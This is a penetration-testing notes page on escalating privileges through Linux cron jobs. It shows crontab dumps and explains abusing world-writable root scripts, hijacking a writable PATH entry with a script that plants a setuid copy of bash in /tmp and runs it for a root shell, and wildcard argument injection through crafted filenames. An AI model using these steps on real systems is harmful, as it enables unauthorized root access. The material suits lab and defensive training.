---
description: Exploiting cron jobs for privilege escalation
---

# Cron Jobs

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs.&#x20;

User crontabs are usually stored in `/var/spool/cron` or `/var/spool/cron/crontabs/`.

The system-wide crontab is located at `/etc/crontab`.

Cron jobs run with security level of user who owns them. by default cron jobs run with `/bin/sh` shell with limited environment variables.

## Format of a Cron job

Cron jobs exist in a certain format, being able to read that format is important if you want to exploit a cron job.&#x20;

```
# = ID
m = Minute
h = Hour
dom = Day of the month
mon = Month
dow = Day of the week
user = What user the command will run as

command = What command should be run

Format:
#  m   h dom mon dow user  command

Eg:
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

\


## Exploiting File Permission Misconfigurations

Misconfiguration of file permissions associated with cron jobs can be utilized for privilege escalation.

Example: For the following cron jobs we can see that a `overwrite.sh` file has been scheduled by the root user.

{% code overflow="wrap" %}
```bash
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
{% endcode %}

Here the overwrite.sh file can be modified if the file is world writable

```
user@debian:~$ ls -la /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```

We can modify it to a reverse shell comand and open a listener at the attacker terminal and get a privileged shell access.

## PATH Environment Variable

The crontab `PATH` environment variable is by default set to `/usr/bin:/bin`.&#x20;

The `PATH` variable can be overwritten in a crontab file. If a cron job script/program does not use an absolute path, and, one of the directories in the `PATH` variable is writable by user, a script/program with same name as the one in the cron job can be created for privilege escalation. &#x20;

Example: Considering the following dump from /etc/crontab file, the PATH variable has `/home/user` in it. &#x20;

{% code overflow="wrap" %}
```bash
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
{% endcode %}

So the "user" user can create a new script named `overwrite.sh` with the following content and make it executable for gaining a privileged shell access.

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

PS: Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:

```
/tmp/rootbash -p
```

## Wildcards

When a wildcard character (`*`) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard. This process replaces the wildcard with a space-separated list of the file and directory names in the current directory.&#x20;

Since file systems in Linux are generally very permissive with filenames, and filename expansion happens before the command is executed, it is possible to pass command line options (e.g. `-h`, `—-he|p`) to commands by creating files with these names.&#x20;

The following commands should show how this works:

```
$ ls *
$ touch ./-l
$ ls *
```

Filenames are not simply restricted to simple options like `-h` or `--he|p`. In fact we can create filenames that match complex options: `--option=key=value`&#x20;

[GTFOBins](https://gtfobins.github.io) can help determine whether a command has command line options which will be useful for our purposes.

#### For binaries which allow other commands to be run with a flag (can be found with GTFOBins), if they are being run by a root/higher privileged user configured cron job scheduled script with \*, we can drop a payload (named as the command execution flag of that specific binary) in a directory of the PATH variable value and get it executed.
